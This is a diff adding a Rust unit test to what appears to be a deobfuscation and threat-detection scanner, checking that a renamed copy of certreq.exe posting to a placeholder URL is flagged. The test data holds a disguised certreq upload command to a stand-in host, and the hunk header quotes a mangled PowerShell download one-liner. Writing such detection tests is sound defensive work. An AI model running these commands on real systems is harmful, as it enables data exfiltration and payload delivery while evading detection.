@@ -33005,6 +33005,54 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_certreq_alias_in_deob_text_emits_config_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\certreq.exe C:\Users\Public\cert.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\certreq.exe"#.to_string(),
+            dst: r#"C:\Users\Public\cert.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\cert.tmp -Post /config:https://copied-certreq.example/submit request.req response.txt"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cert.tmp"#
+                )
+            }),
+            "copied certreq alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "certreq.exe -Post /config:https://copied-certreq.example/submit request.req response.txt"
+                            && url == "https://copied-certreq.example/submit"
+                )
+            }),
+            "copied certreq alias did not replay config URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-certreq.example/submit"
+                )
+            }),
+            "copied certreq URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
